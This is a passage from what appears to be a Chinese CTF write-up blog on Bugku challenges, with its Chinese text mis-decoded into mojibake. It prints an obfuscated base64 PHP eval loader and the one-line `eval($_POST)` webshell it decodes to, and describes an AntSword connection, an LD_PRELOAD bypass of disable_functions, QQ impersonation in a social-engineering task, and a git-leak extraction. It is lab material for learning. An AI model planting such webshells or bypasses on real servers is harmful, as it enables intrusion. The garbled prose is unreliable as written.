1NTF2eUl5U1V5SHRCOWFtVVJTbVBQNmVQdDRCVkMwUzNSTVJKb2pCMGFMdU5pclN1dGh0VW9vTFZnZkNIMFpFVUV1bUpFY0cyS1h2dUlaUmhFdG91eEVvMFBRcEJpVnVzMVBlSHlCZUlNZlJOYTNiaG9KdklDZEJ5eGdMSnlzUDB0TnVCeDduWXk5ZGt0bFBzNWtiMkNxcDNJeHBIUE9CdVBETHVSSW0yMW50MUtDUGhLNVBWeGJ2M3RXUjBJMm9ITW1MMUVHcFVLS29JUlV0eXlBZWZBMlRMNHNieW96R3NDWVNKOWlHdTUxdnlJeVNVeUh0QjlhbVVSU21QUDZlUHQ0QlZDMFMzUk1SSm9qQjBhTHVOaXJTdXRodFVvb0xWZ2ZuVjBaRVVFdW1KRWNHMktYdnVJWlJoRXRvdXhFbzBQUXBCaVZ1czFQZUh5QmVJTWZSTmEzYmhvSnZJQ2RCeXhnTEp5c1AwdE51Qng3bmZFOWRrdGxQczVrYjJDcXAzSXhwSFBPQnVQREx1UkltMjFudDFLQ1BoSzVQVnhidjN0V1IwSTJvSE1tTDFFR3BVS0tvSVJVdHl5QWVmbjFUTDRzYnlvekdzQ1lTSjlpR3U1MXZ5SXlTVXlIdEI5YW1VUlNtUFA2ZVB0NEJWQzBTM1JNUkpvakIwYUx1TmlyU3V0aHRVb29MVmdPQ0gwWkVVRXVtSkVjRzJLWHZ1SVpSaEV0b3V4RW8wUFFwQmlWdXMxUGVIeUJlSU1mUk5hM2Job0p2SUNkQnl4Z0xKeXNQMHROdUJ4N25mTTl6MlAyR3VqREVOSTVtSElab3U5T3RVeDR0c0VtUjJDZFNVaXFMeU0wbTJ5Y295eU1vMUsyR0ppR1BQRUJQMW9hdlVQQ0JCUldlc3lzdjNCREFzS0l1czl4TElLeEJZTWpweW9ndHlva3VWTTVHMFI0dlBLR3RIRUJudWl6UG1NZ1NQb0FCSG9ZblZ0Q0J1NURCMUdPdHN5eFBCNXFCeVBMblBLTlNVRXNuQkExdUowMHpCeWd2VlB5cHlLNUJzUnVleUNocFU1a1BCb2RQQlB6bklvWmJ5eXNuQjVMQllFTnYxb1BlTjl1bll5V29QUnp0MUV1Qll0U251aml1dWlyYjFDSVJJTXhuY1BpdUo1TmV5eXVMc2F5UEppNFBjTTBTeW9HTEh0dW5VR09Hc1JycHlLV25QSUxTMngyb2NDTHAySWd1SmF4UHlFckcwb0RiMUVoQ1BFaHBITUJQVXh1TE5Vam1zUFNQbUIwQlBvV0NQdGh6bUlrUGZQbFB1S3R6QnlxUk5pc3BCb2ZMMENZZDFNS0czUHJ0MEcxUE41TlJQS2h6aHlMdHVGMEJKYXJQTmJPbXNpeHRoeGlCMmlsbkliT3BVdFNwTmlsdVlJam55eWFlSXl1UHNLUFBZSVNSTkNJUHM1UFB1dE9vdWFnUzJuZlB1OXJ0SmlBUDJhRG5KSUdic3RzdVZNYlBKNU5lUEdpQnlFTHBoeGFvUFByTEp0TmJIS3h0MEtxb0JSdUwxdFBSTnhMUEp4Mkd5eHNCMURPQ1BveG5CNVdCUFA0bTFFVnAyOXJ0eUVXRzBCaUwyVU9TSXlMdVVveFBOMXpCUHlHU055eVBodEdCWUNqUDJ0VlBKNVBQZlA1UDFQNEJJRWFwY0l4UzFFVUd5UERCMkVBb1VFdHBteXVCMXhTUE5uT3V1OXJ0UEtRR0J4U0dQQWp2TjV1cFVvdUd5eGpldUNWZVZJU3VVb09QY0lnbXlCanBOeXVMSUUyR2ZNMG1QSVpTSUN1bnNvRUdQUHpTeUVQQllJU3RKeGxvY0lsQ1BLYUNWQ3JMVTQydXlSelJJUkdQSnhZcGhGMEJKaXVMeUdmcFZvb3B5RWFHSmE0bTFDZ3R5UHRuSUFPUEJSMFAxQmpvVXlTbklveEdQb0RwMWJqbkJpc24wRWN1c1BOdnVDdUxoSUNTdWFmTHNvTFMyQ0luQmF4bkp4b0J5eE5HUHRhbXlJb3VOeEtvUFAwdUlBZnZJUnN0MW9aUFB2MWVQUlBlSU1McHVqaUd1YUx0TkVQU0lDa0xOdGxCdTA1UHlDR3V5dFlueXlYTHNQU20ySUF1SklMblZNWlBKaU5QSkVHdlZ5WXQzeGl1eXhOdnliaXBVNVBuTmlLUHN4TFJKbmpSVTF0cEp4bVBZRU5MdUlQbUpLTFBQQWl1c29EYkpiaWJZUFNwbXRmTHN4ekN5S2htSHRodUlvREcyMTRDSUVnUHNLdW4yaTJ1dTVMcHVFV2VVOW1wVW9QQm1NTG55UFZSSVJQbk50RXVZTXVHdUl1U045Qm5jSW5vY0NsYjFLSXRISVlQc3lmTHN4ekN5S2htSHRodUlvREcyMTRDSUVnUHNLdW4yaTJ1dTVMcHVFV2VVOW1wVW9QQm1NTG55UFZSSVJQbk50RXVZTXVHdUl1U045Qm5jSW5vY0NsYjFLSXRISVlQc3lqbVVDTFBQS0FiczVtcGh0WFAwUHVlSVJXQ3VLUHQwRzB1dTVnbUlHam9jb3VweUVndVlJTlJ1Q2dwVTFCbklLam9JUmp0UFVPbkJ5UHBoRmZCUFByUnlvUHBjRVBuMDVhTDBDTHQxdGFTY0VoUzJ0ZHVZSVNCeW9obm1vWXBzRWZHdTF1ZU5VanpQS0JQczVydXVpTG5OQWZtc2lCdEJEMFB1aXNTSUNWcFV0b25Jb0lvSVJMdVBJR29JSXlQMUsxbVV0TXYwS0FtWW9TUDA1MFAxeHVTTkNhZWN0THBJb3JQWUNnUnl5WkJKMWtTM3hRQjJpTlBQVWpCWUVQdDN0aFBtTXNMUERqUEpJeFBKeFhQY3dpbU5iZmJzQ1N0Qm9pRzFvRXZVYW1TM01RUmYwOUFrc0t6ZjgrUWM5alNWd0ZvTlBKU3U1eXJsUlpTeW81djBFU1JIeE9tTmFOdXV0enAyb1lvMFIxR2hSVUxKRWd2VTltQkJQQUJ5UGFMMnlNU1ZLRWIyUDBCVTFpdUlSQkVPaWpvSmE2dVBQeXBWeEl0MjF1RzJ0VW1zaUJTeXhjQjB5SG1CRWRtM1BBYkJvNUJIdHhHSjlpUjBLS0JQUjJ2MUtPQk54WnJtZ3NtMmladE5hNm1KUGlSSktkcFB5RG1CRUVCM3hyYjNQU295SUxSMGloTFVSTnYzdFBHMElYdUlvNXZKRUt0UHRiR3V0SHZjMTF2Smlzb3VDWG9OQkRBa0IydG1VeUMwVXlDWUF5bnNHeUNzYnlDWVUxRW1QY0VtdjJFbXYwbmxCMnptQTRFbUVVRW12akVtdjRFbXYxRW12aUVtdjVFbUVNQ2tCMmJPQjNua0IyYmtCMkNsQjJDZnN5Q0JHeUNZQnlDWUZ5Q1lueUNmbnlDZnZ5Q3NHMEVtRWxFbUcybmZ2eUNzVWtybWdzTE5FR29WdFZQdWF5dEJ0Z0JKUmpSM0N4dkpvWlB5eVhQSUNkTHVDYlJKeGNQMktsU2hLdG1JSzR0czExZXUxTW1ISXJtZjBzbTJpWnROYTZtSlBpUkpLZHBQeURtQkVFQjN4cmIzUFNveUlMUjBpaExVUk52M3RQRzBJWHVJbzV2SkVLdFB0Ykd1dEh2VmdmVEw0c20yaVp0TmE2bUpQaVJKS2RwUHlEbUJFRUIzeHJiM1BTb3lJTFIwaWhMVVJOdjN0UEcwSVh1SW81dkpFS3RQdGJHdXRIdlZnMlRMNHNtMmladE5hNm1KUGlSSktkcFB5RG1CRUVCM3hyYjNQU295SUxSMGloTFVSTnYzdFBHMElYdUlvNXZKRUt0UHRiR3V0SHZWZ2ZuMzBaRVU5Z3BzdFdlczV5dmhvcUwyMW9TVTFsTFBDNExzQzF1Sm90QkhSblAweFZ0SEMwUHVDTXAxeHVlaEVrU0JQQkJOSXNvM003bmZNOXpPdEVwMkN5YjI1aVBzYVF0SmFPcElFcVBQTUlvVTVEYmhQbW1CS2xlSjFWUnl0bmVodEt2MlJqdXl5a0JQeEFvc3QzUDN4eFFMdFFwTjVVUzNLem9oSTJTc2FhdXV4Q2JzeW1lVUtjUlBLSkJQRTNtSVJBdDBvZlJJUFlidTlHUEh5T0dKeUlQSU14b05SamVmbmZUTDRzbTJpWnROYTZtSlBpUkpLZHBQeURtQkVFQjN4cmIzUFNveUlMUjBpaExVUk52M3RQRzBJWHVJbzV2SkVLdFB0Ykd1dEh2VmdpblYwWkVVOWdwc3RXZXM1eXZob3FMMjFvU1UxbExQQzRMc0MxdUpvdEJIUm5QMHhWdEhDMFB1Q01wMXh1ZWhFa1NCUEJCTklzbzNNN25ZdDlka3RRcE41VVMzS3pvaEkyU3NhYXV1eENic3ltZVVLY1JQS0pCUEUzbUlSQXQwb2ZSSVBZYnU5R1BIeU9HSnlJUElNeG9OUmplZlVqVEw0c20yaVp0TmE2bUpQaVJKS2RwUHlEbUJFRUIzeHJiM1BTb3lJTFIwaWhMVVJOdjN0UEcwSVh1SW81dkpFS3RQdGJHdXRIdlZnT0NWMDdFVXRZR0h5Ym1ITW9CMGExdEJDMm91YUVQeUtnbTFJTlBVMTNvMXhLcHNJSkd1OUFvVktpU1VSaEJIRW52MjFyYkpLUFJWRjlFVXlYRzJQY3BISXVMMDlOUzNFZ0JKS1BCVVBzbUp4TVJQQ0NMc0U2cEJSMlBVaTVSTnlmbzNNU3V1RXR1VXhKdFZSaGVOSTduVjBaRVU5Z3BzdFdlczV5dmhvcUwyMW9TVTFsTFBDNExzQzF1Sm90QkhSblAweFZ0SEMwUHVDTXAxeHVlaEVrU0JQQkJOSXNvM003bm14OWRrdFFwTjVVUzNLem9oSTJTc2FhdXV4Q2JzeW1lVUtjUlBLSkJQRTNtSVJBdDBvZlJJUFlidTlHUEh5T0dKeUlQSU14b05SamVmQzlka3RFcDJDeWIyNWlQc2FRdEphT3BJRXFQUE1Jb1U1RGJoUG1tQktsZUoxVlJ5dG5laHRLdjJSanV5eWtCUHhBb3N0M1AzeHhlZk05ZGt0RXAyQ3liMjVpUHNhUXRKYU9wSUVxUFBNSW9VNURiaFBtbUJLbGVKMVZSeXRuZWh0S3YyUmp1eXlrQlB4QW9zdDNQM3h4ZWZJOWRrdFFwTjVVUzNLem9oSTJTc2FhdXV4Q2JzeW1lVUtjUlBLSkJQRTNtSVJBdDBvZlJJUFlidTlHUEh5T0dKeUlQSU14b05SamVmQTBUbWdzUzJDM0wyRW1vMnhoU2hLb3RoUE10MHRRUFVveExJeHRCSHRabVZ5bHBVS2piMHlhb3VLZnZzNTJ1SEliUFBvNG9zMXNwZjBzbTJpWnROYTZtSlBpUkpLZHBQeURtQkVFQjN4cmIzUFNveUlMUjBpaExVUk52M3RQRzBJWHVJbzV2SkVLdFB0Ykd1dEh2VmczVEw0c20yaVp0TmE2bUpQaVJKS2RwUHlEbUJFRUIzeHJiM1BTb3lJTFIwaWhMVVJOdjN0UEcwSVh1SW81dkpFS3RQdGJHdXRIdlZnaW4zMDdFVXhrdU50MHQxUFdvQlBVcElFSHZWUmZHaEVKcHlvb3AxdG1MMHlZQlZvRGIxUnFiSnk2QkJpU2VVb0NSaHlhYkI1aUxzOFpRTHRRcE41VVMzS3pvaEkyU3NhYXV1eENic3ltZVVLY1JQS0pCUEUzbUlSQXQwb2ZSSVBZYnU5R1BIeU9HSnlJUElNeG9OUmplZkFPVEw0c20yaVp0TmE2bUpQaVJKS2RwUHlEbUJFRUIzeHJiM1BTb3lJTFIwaWhMVVJOdjN0UEcwSVh1SW81dkpFS3RQdGJHdXRIdlZnZkNIMFpFVTlncHN0V2VzNXl2aG9xTDIxb1NVMWxMUEM0THNDMXVKb3RCSFJuUDB4VnRIQzBQdUNNcDF4dWVoRWtTQlBCQk5Jc28zTTduWXk5ZGt0UXBONVVTM0t6b2hJMlNzYWF1dXhDYnN5bWVVS2NSUEtKQlBFM21JUkF0MG9mUklQWWJ1OUdQSHlPR0p5SVBJTXhvTlJqZWZBMlRMNHNtMmladE5hNm1KUGlSSktkcFB5RG1CRUVCM3hyYjNQU295SUxSMGloTFVSTnYzdFBHMElYdUlvNXZKRUt0UHRiR3V0SHZWZ2ZuVjBaRVU5Z3BzdFdlczV5dmhvcUwyMW9TVTFsTFBDNExzQzF1Sm90QkhSblAweFZ0SEMwUHVDTXAxeHVlaEVrU0JQQkJOSXNvM003bmZFOWRrdFFwTjVVUzNLem9oSTJTc2FhdXV4Q2JzeW1lVUtjUlBLSkJQRTNtSVJBdDBvZlJJUFlidTlHUEh5T0dKeUlQSU14b05SamVmbjFUTDRzbTJpWnROYTZtSlBpUkpLZHBQeURtQkVFQjN4cmIzUFNveUlMUjBpaExVUk52M3RQRzBJWHVJbzV2SkVLdFB0Ykd1dEh2VmdPQ0gwWkVVOWdwc3RXZXM1eXZob3FMMjFvU1UxbExQQzRMc0MxdUpvdEJIUm5QMHhWdEhDMFB1Q01wMXh1ZWhFa1NCUEJCTklzbzNNN25mTTl6MlAyR3VqREVVeGt1TnQwdDFQV29CUFVwSUVIdlZSZkdoRUpweW9vcDF0bUwweVlCVm9EYjFScWJKeTZCQmlTZVVvQ1JoeWFiQjVpTHM4REFzS0lTTjFzUHM1WlBJUHJCTlBWU1Zvc3BzRGpHSjBpdUpQYVJJb0xuSUtOUDI1enZJRU5TY1BtUzJpZnV1YTB0SUdPdlZSdVMzeHRQc3hzU0pDaFBKeEJTMG9tdXNvSXpCeWdvY010bjJ4NkcxUHVuUHRJQ1BQUG5OdG1HbUlTcFBSV1JVeXhwSW9TUEJQZ1J5RE9DQkN4UFBLWEcyMXJDUGJpU054b25Vb2dHc3ZpbjJDSXZOYXlweUtMQnNCaXQxeWdMeUtrUzN4Z1BZQ3VMSW9JUlZLQnBWd09QY0NsU3lEalBIeXN0Snhjb0JQekJKRVZ2SVJTUzFBZlBtQWlDdUNQU1ZNeG5CRXpvdTFMTDF5UHBWb3RQMnh1UDBSSEN1UFp0SjV4UHV0bVBJUlNTMkNVTEoxa3Bzb1Z1UHhEU0lvcXBVNVlQUEtTUEJSemVzNVBlY0VQUHNFckJQb2xTMDFhUk41bXBJbzRtQnhsUjJDVlBtSWtuMEV6QllJTm0wMGZ1SjFvUFVFUXVtQ0xteVJHdklQQ1B1dFFQTjVycFBuZnVzUkN1SW80RzJpU0NOVWl2SUl4TFVBMVBOYU5QdVB1dVlNc1Nzb2x1c3ZpQ3MxVm1zRVluMXk1b1VQU0NKUEl2SVJRUEJvUG1QUHNlUEVxbXlJb3BKdDZQQlBnZU5QUG9OYW10VUt0R1lDWWVQeWF0Skt1dGZiNUx1SzBwTnRhdEhDZGIyblhCTnlZUkJLSVNOeWh0MUFqQllJdXZ5S1BQc1BrdHNLWkcweHNleXlHTEoxa3BJS1NHWUlMUEluanBOS1BMSUtYQm1Jc3ZQSWFwY29QUGh4eG9CUFNtSnRHcFZ0dFBtUDRCMmc0cDBLSXBWb29ueW9VR0o1TlAxbmp6QlJ4bjBLZlB1MWpQeVBJUEphQnB1eGxvSW96bXlDV0xZb2tQdWJPUHNQNEN1dFZwVktTbjBFeFAxUnJCeVJJU04xTExOdEdvQlJJcDBLSUJKS29wSml0UE41bHV5QmpSY0lMUEI0T3V5UjBMeW9ndlZDQm5Cb1ZQc0JpbjFEaVNWTWtTMG9hdVB2NUxQS0F2Vnh4dHV0R1B1NXJtdW5PbkJhdHBoTXVvVXhIcDBLSVNOMXNQczVaUElQckJOUFZTVm9zcHNEakdKMGl1SlBhUklvTG5JS05QMjV6dklFTlNjUG1TMmlmdXVhMHRJR092VlJ1UzN4dFBzeHNTSkNoUEp4QlMwb211c29JdjBLVlJOS3NuVnRLUG1Fc3AxR09wY29oUFBHaUJQUHN0UGJpQnNSb1B1eG9QUG9ybk5FV2VjUHRwaHhkRzBQekxKRWhQSElZbjBLUW9OaWplSVBOUHlSeXQxS3p1c3Y0dkIxS1MzQ3J0UEVxdXU1Z0JQdFpieUtQblZiaUJ5UHpueUtoUlVLdXBWTWZQY0lOdDFvSW5tQ1NudXhqR0phTnBQeWh6QnlTTFZNNEdCUHN1SVBaTHMxWW5ZSWRCdTFqUEp0QW8yOXJ0dXhhb0lvenB5dFBMeU15dDJ4Mm9ONXJuTkVhblBLeXBodHVCWU1TdHlSWm1ITUx0SkYxQjJhZ3YxeVdSVXR1bkhNM1BKYTRCUG9Bb05LWVAxb0RQTmFOQjFLTnRoQ3J0M3Rxb2NNMFNQQk9vTjl1bkpqMlAxUHVuUElQb1VQQm5QRVZ1UFBEdVBQdUxZTWtTM0YxQnUxNEwyQ0ltc0trUDFvaUdmQ3JtMnRndlZ4UHR5b2hvQlJTbXlLVnpWQ3J0M3Rxb2NNMFNQQk9vTjl1bkpqMlAxUHVuUElQb1VQQm5QRVZ1UFBEdVBQdUxZTWtTM0YxQnUxNEwyQ0ltc0trUDFvaUdmQ3JtMnRndlZ4UHR5b2hvQlJTbXlLVnpWTW5iMUVJdW1FckNQUElDaFJoUHM1bm9JUHV0TnRhUEhFbVB5S3hHc0I1QnlFZ0JzNXNuSnRvR1B2MWJ5S2F0SG9tdDFBMkcxUkRMSUdpTEh5QkxVNTBCMmFydlBvR0JZdGRiMUVFdUo1dVBJRGpuQkNCbjJ4WEdZQ1NldXRWQ2h0aHVWTU9QeVBzdDFFdXZWS3hQUEVvb1BQakxKRVZMc2l0bnV0aUcwb1NtUFBOQllDb24wb2d1UEIxYnlQYUJ5RW50VUlmTHNSMFNKYmpSTnlQbkp0WFBZRWdDeVJQUFlJdFB1dElQY0lMdDF5UFNJeVBQc0RqR0phNENQSWFlVWFZdEI1ckd5UnV2dW5mTHM5c3BWTTRQQm91UDJQVnVzNVN0ZnhqTDFDV3ZVOTNRbTBrckxzN1FmND0iO2V2YWwoJz8+Jy4kQndsdHFPWWJIYVFrUlBOb3hjZm5GbXpzSWpoZE1EQVdVZUtHZ3ZpVnJKWnBMdVhFVFN5QygkaFlYbFRnQnFXQXBPYnhKdmVqUFJTZEhHUW5hdURpc2ZFTklGeW9jcmtVTHdtS01DdFZ6Wigkdk53VE9zS1BFQWxMY2lKREJoV3RSU0hYZW1wSXJqeVFVdUdvYWtuWUNkRnpxWk14ZmJnVigkTnZpdXl3Q2VQV0VHbGFjQW1manJnQk1UWVh6SFpwSXhEcVFuc1VLa2hvdEZTT1JkVkpMYiwkY2lNZlRYcFBvSkh6WkJ4TE92bmdqUUNiZElHa1lsVk5TdW1GckFVZVdhc0t5RXR3aERxUioyKSwkdk53VE9zS1BFQWxMY2lKREJoV3RSU0hYZW1wSXJqeVFVdUdvYWtuWUNkRnpxWk14ZmJnVigkTnZpdXl3Q2VQV0VHbGFjQW1manJnQk1UWVh6SFpwSXhEcVFuc1VLa2hvdEZTT1JkVkpMYiwkY2lNZlRYcFBvSkh6WkJ4TE92bmdqUUNiZElHa1lsVk5TdW1GckFVZVdhc0t5RXR3aERxUiwkY2lNZlRYcFBvSkh6WkJ4TE92bmdqUUNiZElHa1lsVk5TdW1GckFVZVdhc0t5RXR3aERxUiksJHZOd1RPc0tQRUFsTGNpSkRCaFd0UlNIWGVtcElyanlRVXVHb2FrbllDZEZ6cVpNeGZiZ1YoJE52aXV5d0NlUFdFR2xhY0FtZmpyZ0JNVFlYekhacEl4RHFRbnNVS2tob3RGU09SZFZKTGIsMCwkY2lNZlRYcFBvSkh6WkJ4TE92bmdqUUNiZElHa1lsVk5TdW1GckFVZVdhc0t5RXR3aERxUikpKSk7&quot;</span>)); <span class="meta">?&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>è§£phpæ··æ·†å¯å‚è€ƒä¸€ä¸‹è¿™ç¯‡æ–‡ç« </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https:&#x2F;&#x2F;www.52pojie.cn&#x2F;thread-1074918-1-1.html</span><br></pre></td></tr></table></figure><p>è§£å‡ºåï¼Œå¾—åˆ°ä¸€æ®µphpä»£ç </p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">@<span class="keyword">eval</span>(<span class="variable">$_POST</span>[ymlisisisiook]);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>ç”¨èšå‰‘è¿›è¡Œè¿æ¥<br> <img src="https://blog-file-1302856486.file.myqcloud.com/%E6%96%B0bugku/getshell/QQ%E6%88%AA%E5%9B%BE20210102234659.png" alt=""><br> è¿æ¥æˆåŠŸåï¼Œå‘ç°åªèƒ½è®¿é—®htmlä¸‹çš„æ–‡ä»¶ï¼Œæ— æ³•è®¿é—®å…¶ä»–åœ°æ–¹<br> <img src="https://blog-file-1302856486.file.myqcloud.com/%E6%96%B0bugku/getshell/QQ%E6%88%AA%E5%9B%BE20210102234746.png" alt=""><br> ä½¿ç”¨èšå‰‘çš„æ’ä»¶æŸ¥çœ‹<br> <img src="https://blog-file-1302856486.file.myqcloud.com/%E6%96%B0bugku/getshell/%401_G8RIP%40LEN%60S1BS~_392H.png" alt=""><br> å‘ç°putenvæ²¡æœ‰è¢«ç¦ç”¨ï¼Œæœæ–­é‡‡å–LD_PRELOADæ–¹æ³•ç»•è¿‡ğŸ˜‹<br> <img src="https://blog-file-1302856486.file.myqcloud.com/%E6%96%B0bugku/getshell/6GH~0V%7D84%29B%7DA%24CIRIA_HG7.png" alt=""><br> ç”Ÿæˆæ–‡ä»¶ä¹‹åï¼Œå†è¿æ¥æˆ‘ä»¬ç”Ÿæˆçš„é‚£ä¸ªæ–‡ä»¶<br> <img src="https://blog-file-1302856486.file.myqcloud.com/%E6%96%B0bugku/getshell/WWVHCE%24U9%7B63MW%60I5LGAU%60I.png" alt=""><br> è¿æ¥åï¼Œå¯ä»¥çªç ´é™åˆ¶è®¿é—®å…¶ä»–åœ°æ–¹<br> <img src="https://blog-file-1302856486.file.myqcloud.com/%E6%96%B0bugku/getshell/%7BN83F_52HH4~9ZTQB%2543%5DYW.png" alt=""><br> flagåœ¨æ ¹ç›®å½•ä¸‹è·å¾—ğŸ˜€<br> <img src="https://blog-file-1302856486.file.myqcloud.com/%E6%96%B0bugku/getshell/%28KDTXR%40KF5NY%7D%5DX8U2ZKGIJ.png" alt=""></p><h3 id="ç¤¾å·¥-ä¼ªé€ "><a class="header-anchor" href="#ç¤¾å·¥-ä¼ªé€ ">Â¶</a>ç¤¾å·¥-ä¼ªé€ </h3><p>é¦–å…ˆé¢˜ç›®æ˜¯ç¤¾å·¥ç±»ï¼Œæç¤ºä¿¡æ¯ä¼ªé€ <br> <img src="https://blog-file-1302856486.file.myqcloud.com/%E6%96%B0bugku/%E7%A4%BE%E5%B7%A5%E4%BC%AA%E9%80%A0/D9%28M%29DCU%5BND%24VKY%7D~U%5DUGQ3.png" alt=""><br> å¼€å¯ç¯å¢ƒ<br> <img src="https://blog-file-1302856486.file.myqcloud.com/%E6%96%B0bugku/%E7%A4%BE%E5%B7%A5%E4%BC%AA%E9%80%A0/%7D%60U08%60%29FL%24A%24Z48%7D1F~%2526L.png" alt=""><br> è¿™é‡Œè¾“å…¥æˆ‘çš„qqå°å·è¿›å…¥<br> <img src="https://blog-file-1302856486.file.myqcloud.com/%E6%96%B0bugku/%E7%A4%BE%E5%B7%A5%E4%BC%AA%E9%80%A0/%60_A04M1D%5DKDB%606W6A%25%7D%40F6O.png" alt=""><br> å¯¹è¯ä¹‹åï¼Œå°ç¾å‘Šè¯‰æˆ‘ä»¬å¥¹åªå‘Šè¯‰å¥¹çš„ç”·æœ‹å‹flagï¼Œæˆ‘ä»¬å»å¥¹çš„ç©ºé—´çœ‹çœ‹<br> <img src="https://blog-file-1302856486.file.myqcloud.com/%E6%96%B0bugku/%E7%A4%BE%E5%B7%A5%E4%BC%AA%E9%80%A0/C~%5D%5D~Z5XHO6X%406PILOH75%7DF.png" alt=""><br> è¿™é‡Œæœ‰å¼ å¥¹å’Œå¥¹ç”·æœ‹å‹çš„èŠå¤©çš„æˆªå›¾<br> <img src="https://blog-file-1302856486.file.myqcloud.com/%E6%96%B0bugku/%E7%A4%BE%E5%B7%A5%E4%BC%AA%E9%80%A0/S10114-20264579.jpg" alt=""><br> ç»“åˆé¢˜ç›®æç¤ºï¼Œæˆ‘ä»¬æŠŠqqåå­—å’Œå¤´åƒéƒ½æ¢æˆå¥¹ç”·æœ‹å‹çš„<br> <img src="https://blog-file-1302856486.file.myqcloud.com/%E6%96%B0bugku/%E7%A4%BE%E5%B7%A5%E4%BC%AA%E9%80%A0/FOGG2UKMK%40%241YY%7BW%60Q%5D8CZT.png" alt=""><br> å†è¿›è¡Œä¸€æ¬¡ç™»å½•ï¼Œå‘å°ç¾è¦flag<br> <img src="https://blog-file-1302856486.file.myqcloud.com/%E6%96%B0bugku/%E7%A4%BE%E5%B7%A5%E4%BC%AA%E9%80%A0/2T5SNT_G%7D2E0%2967AX0N%5BQ%7D9.png" alt=""><br> æˆåŠŸè·å–flag</p><h3 id="web40"><a class="header-anchor" href="#web40">Â¶</a>web40</h3><p>æ‰“å¼€ç¯å¢ƒ<br> <img src="https://blog-file-1302856486.file.myqcloud.com/%E6%96%B0bugku/web40/MJGP%28LDT%5BFU%40%7DTU%25KDU%24N%5B6.png" alt=""><br> è¿™é‡Œflagè§£ç åæ˜¯ä¸€ä¸ªå‡çš„flagğŸ˜¡<br> ä½†ä»”ç»†å†çœ‹ï¼Œæºç æç¤ºæˆ‘ä»¬tigï¼Œtigæ˜¯gitçš„æ–‡æœ¬ç•Œé¢ï¼Œå¯å……å½“å„ç§gitå‘½ä»¤çš„è¾“å‡ºä¼ å‘¼æœº<br> è¯´æ˜å¯èƒ½è¿™é‡Œå­˜åœ¨gitæ³„éœ²ï¼Œæˆ‘ä»¬ç”¨dirsearchæ‰«æéªŒè¯ä¸€ä¸‹<br> <img src="https://blog-file-1302856486.file.myqcloud.com/%E6%96%B0bugku/web40/DI%29GWU0NU6TV%7DABKK1HZ~%5DY.png" alt=""><br> ç¡®å®å­˜åœ¨gitæ³„éœ²ï¼Œé‚£ç›´æ¥æ‹¿extractå†²å®ƒ<br> <img src="https://blog-file-1302856486.file.myqcloud.com/%E6%96%B0bugku/web40/Q6C%28FA07~NI8%25GR9%7D1CS%29~C.png" alt=""><br> åœ¨è¾“å‡ºçš„æ–‡ä»¶å¤¹ä¸­çœ‹åˆ°ä¸€å †æ–‡æœ¬æ–‡ä»¶ï¼Œåœ¨å…¶ä¸­ä¸€ä¸ªæ–‡ä»¶ä¸­æ‰¾åˆ°æ­£ç¡®çš„flag<br> <img src="https://blog-file-1302856486.file.myqcloud.com/%E6%96%B0bugku/web40/VE%5B8C5BG5W%5B%40XA%7DR9_7%2887S.png" alt=""></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;git_is_good_distributed_version_control_system&#125;</span><br></pre></td></tr></table></figure><h3 id="sodirty"><a class="header-anchor" href="#sodirty">Â¶</a>sodirty</h3><p>æ‰“å¼€ç½‘ç«™ï¼Œæ²¡æ‰¾åˆ°ä»€ä¹ˆæœ‰ç”¨çš„ä¿¡æ¯<br> <img src="https://blog-file-1302856486.file.myqcloud.com/%E6%96%B0bugku/sodirty/%40T%5DLG05HHJJG3T%5BRLO6JWAQ.png" alt=""><br> æ‰«æäº†ä¸€ä¸‹ï¼Œå‘ç°å­˜åœ¨ä¸€ä¸ªwww.zip<br> <img src="https://blog-file-1302856486.file.myqcloud.com/%E6%96%B0bugku/sodirty/QGIHVV%29TLR_4AM%25%5BNCO%7D%298O.png" alt=""><br> è®¿é—®åä¸‹è½½å‹ç¼©åŒ…ï¼Œè§£å‹åï¼Œæ‰“å¼€index.jså¾—åˆ°æºç </p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> express = <span class="built_in">require</span>(<span class="string">&#x27;express&#x27;</span>);</span><br><span class="line"><span class="keyword">const</span> setFn = <span class="built_in">require</span>(<span class="string">&#x27;set-value&#x27;</span>);</span><br><span class="line"><span class="keyword">var</span> router = express.Router();</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> Admin = &#123;</span><br><span class="line">    <span class="string">&quot;password&quot;</span>:process.env.password?process.env.password:<span class="string">&quot;password&quot;</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">router.post(<span class="string">&quot;/getflag&quot;</span>, <span class="function"><span class="keyword">function</span> (<span class="params">req, res, 